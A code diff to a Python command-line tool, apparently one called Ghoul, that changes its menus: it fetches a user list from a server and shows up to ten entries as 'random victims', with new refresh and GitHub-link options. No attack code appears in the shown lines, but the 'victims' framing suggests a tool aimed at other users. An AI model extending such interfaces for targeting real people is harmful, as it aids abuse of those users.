@@ -130,7 +130,10 @@ def ui(spaces):
 def menu(mode: int = 0, username: str = False):
     ui("\n")
     if mode == 0:
+        Col.gprint("\n\n\nGetting victims...")
         modestable = mkmodes()
+        clear()
+        ui('\n')
         Col.dgprint(center(modestable))
 
     print("\n\n")
@@ -164,17 +167,22 @@ def menu(mode: int = 0, username: str = False):
         return add()
 
 def discover():
-    Col.gprint("Getting usernames...")
+    Col.gprint("Getting victims...")
 
     usernames = get(url + "/all").text.splitlines()
     shuffle(usernames)
     m = min(len(usernames), 10)
-    usr = {"+": "{} random victims out of {}".format(m, len(usernames))}
+    usr = {"+": "{} random victims out of {}".format(m, len(usernames)), "0": "Refresh"}
     for a, b, _, in zip(range(1,len(usernames)+1), usernames, range(m)):
         usr[a] = b
     ui("\n\n")
     Col.dgprint(center(maketable(usr, "Usernames").table))
     choice = Col.ginput("-> ")
+    if choice == "0":
+        return menu(mode=1)
+    elif choice == "+":
+        openb("https://github.com/billythegoat356/Ghoul")
+        return menu()
     try:
         choice = int(choice)
     except ValueError:
